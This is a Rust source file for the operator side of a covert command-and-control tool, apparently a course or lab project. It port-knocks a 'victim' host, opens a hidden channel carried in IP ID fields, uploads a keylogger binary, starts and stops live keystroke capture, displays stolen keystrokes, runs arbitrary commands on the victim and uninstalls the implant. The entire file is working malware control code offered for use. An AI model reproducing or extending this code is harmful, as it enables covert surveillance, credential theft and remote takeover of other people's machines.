use std::io::{self, Write};
use std::net::{IpAddr, Ipv4Addr};
use std::thread;
use std::time::Duration;
use pnet::datalink::{self, Channel};

// Module declarations
mod port_knkr;
mod pcap_capture;
mod keylogger;
mod covert;

use port_knkr::KnockSession;
use pcap_capture::PcapHandle;
use covert::CovertChannel;

// Command Codes for Covert IPID Channel
const CMD_START_LOGGER: u8   = 0x10;
const CMD_STOP_LOGGER: u8    = 0x20;
const CMD_UNINSTALL: u8      = 0x30;
const CMD_START_TRANSFER: u8 = 0x40;
const CMD_EOF: u8            = 0x41;

#[derive(Debug, PartialEq)]
enum SessionState {
    Disconnected,
    Connected,
}

struct Commander {
    state: SessionState,
    victim_ip: Option<Ipv4Addr>,
    local_ip: Option<Ipv4Addr>,
    knock_session: Option<KnockSession>,
    pcap_handle: Option<PcapHandle>,
    // Persistent covert channel transmitter
    covert_chan: Option<CovertChannel>,
}

impl Commander {
    fn new() -> Self {
        Self {
            state: SessionState::Disconnected,
            victim_ip: None,
            local_ip: None,
            knock_session: None,
            pcap_handle: None,
            covert_chan: None,
        }
    }

    pub fn run(&mut self) {
        println!("=== C2 Server ===");
        loop {
            match self.state {
                SessionState::Disconnected => self.disconnected_menu(),
                SessionState::Connected => self.connected_menu(),
            }
        }
    }

    fn disconnected_menu(&mut self) {
        println!("\n--- Status: Offline ---");
        println!("1) Initiate session (Port Knock)");
        println!("0) Exit");

        match prompt("Selection > ").as_str() {
            "1" => self.initiate_connection(),
            "0" => std::process::exit(0),
            _ => println!("[!] Invalid selection"),
        }
    }

    fn connected_menu(&mut self) {
        println!("\n--- Status: Connected to {} ---", self.victim_ip.unwrap());
        println!("1)  Disconnect from victim");
        println!("2)  Uninstall from victim");
        println!("3)  Transfer keylogger to victim");
        println!("4)  Start keylogger (Live sniffing)");
        println!("5)  Stop keylogger");
        println!("6)  View Captured Keys (from pcap logs)");
        println!("7)  Transfer file TO victim");
        println!("11) Run program on victim");

        match prompt("Selection > ").as_str() {
            "1"  => self.disconnect(),
            "2"  => self.uninstall(),
            "3"  => self.transfer_keylogger(),
            "4"  => self.start_keylogger(),
            "5"  => self.stop_keylogger(),
            "6"  => self.view_keylog(),
            "11" => self.run_program(),
            _    => println!("[!] Invalid selection"),
        }
    }

    fn initiate_connection(&mut self) {
        let ip_input = prompt("Enter target Victim IP [default: 127.0.0.1]: ");
        let target_ip = if ip_input.is_empty() { 
            "127.0.0.1".parse::<Ipv4Addr>().unwrap() 
        } else {
            match ip_input.parse::<Ipv4Addr>() {
                Ok(ip) => ip,
                Err(_) => { println!("[!] Invalid IP"); return; }
            }
        };

        // 1. Find Interface & Local IP
        let iface_name = Self::find_best_interface(target_ip).unwrap_or_else(|| "lo".to_string());
        let interfaces = datalink::interfaces();
        let interface = interfaces.into_iter().find(|i| i.name == iface_name).unwrap();
        
        let local_ip = interface.ips.iter()
            .find_map(|ip| if let IpAddr::V4(v4) = ip.ip() { Some(v4) } else { None })
            .unwrap_or(Ipv4Addr::new(127, 0, 0, 1));

        self.victim_ip = Some(target_ip);
        self.local_ip = Some(local_ip);

        // 2. Port Knock & Seed Generation
        // This generates the random ports based on the seed
        println!("[*] Executing knocking sequence...");
        match port_knkr::port_knock(target_ip) {
            Ok(session) => {
                println!("[+] Port knock active.");
                println!("[+] Session Established: C2->{} | Victim->{}", session.tx_port, session.rx_port);
                
                // 3. Initialize Bidirectional Covert Channel
                // We use the ports generated by the RNG in the KnockSession
                let (chan, rx) = CovertChannel::new(
                    &interface, 
                    target_ip, 
                    local_ip, 
                    session.tx_port, // Send TO this port
                    session.rx_port  // Listen ON this port
                );

                self.covert_chan = Some(chan);
                
                // 4. Start the Background Listener
                // This handles incoming data from the victim
                if let Some(chan_ref) = &self.covert_chan {
                    covert::start_listening(rx, chan_ref.config.clone());
                }

                self.knock_session = Some(session);
                self.state = SessionState::Connected;
            }
            Err(e) => println!("[!] Knock failed: {}", e),
        }
    }

    fn start_keylogger(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending 'START' signal. Live output will appear below:");
            chan.send_byte(CMD_START_LOGGER);
        }
    }

    fn stop_keylogger(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            chan.send_byte(CMD_STOP_LOGGER);
            println!("[+] Stop command sent.");
        }
    }

    fn view_keylog(&self) {
        let path = "../data/pcaps/captured_ascii.txt";
        println!("\n--- Captured Keystrokes (from {}) ---", path);
        match std::fs::read_to_string(path) {
            Ok(content) => println!("{}", content),
            Err(_) => println!("[!] No keylog data found at that path."),
        }
    }

    fn run_program(&mut self) {
        let cmd = prompt("Command to run: ");
        if cmd.is_empty() { return; }

        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Sending command. Watch live output:");
            for byte in cmd.as_bytes() {
                chan.send_byte(*byte);
                thread::sleep(Duration::from_millis(10));
            }
            chan.send_byte(b'\n'); 
            // Note: We don't need a loop here; PcapHandle thread prints the response!
        }
    }

    fn uninstall(&mut self) {
        if let Some(ref mut chan) = self.covert_chan {
            chan.send_byte(CMD_UNINSTALL);
            println!("[*] Uninstall command sent.");
        }
    }

    fn disconnect(&mut self) {
        println!("[*] Closing session...");
        if let Some(session) = &self.knock_session { session.stop(); }
        self.knock_session = None;
        self.pcap_handle = None;
        self.covert_chan = None;
        self.state = SessionState::Disconnected;
    }

    fn find_best_interface(target_ip: Ipv4Addr) -> Option<String> {
        let interfaces = datalink::interfaces();
        for iface in interfaces {
            if !iface.is_up() || iface.is_loopback() { continue; }
            for ip_net in &iface.ips {
                if let IpAddr::V4(_) = ip_net.ip() {
                    if ip_net.contains(IpAddr::V4(target_ip)) { return Some(iface.name); }
                }
            }
        }
        datalink::interfaces().into_iter()
            .find(|i| i.is_up() && !i.is_loopback())
            .map(|i| i.name)
    }

    fn transfer_keylogger(&mut self) {
        let paths = ["target/release/keylogger_bin", "target/debug/keylogger_bin"];
        let mut data = None;

        for path in paths {
            if let Ok(bytes) = std::fs::read(path) {
                data = Some(bytes);
                println!("[*] Found binary at: {}", path);
                break;
            }
        }

        let data = match data {
            Some(d) => d,
            None => { println!("[!] Binary not found."); return; }
        };

        if let Some(ref mut chan) = self.covert_chan {
            println!("[*] Transferring {} bytes...", data.len());
            chan.send_byte(CMD_START_TRANSFER);
            thread::sleep(Duration::from_millis(200));

            for (i, byte) in data.iter().enumerate() {
                chan.send_byte(*byte);
                thread::sleep(Duration::from_micros(150)); 
                if i % 1000 == 0 {
                    print!("\r[*] Progress: {}/{}", i, data.len());
                    io::stdout().flush().unwrap();
                }
            }
            chan.send_byte(CMD_EOF);
            println!("\n[+] Transfer complete.");
        }
    }
}

fn prompt(msg: &str) -> String {
    print!("{}", msg);
    io::stdout().flush().unwrap();
    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();
    input.trim().to_string()
}

fn main() {
    let mut commander = Commander::new();
    commander.run();
}
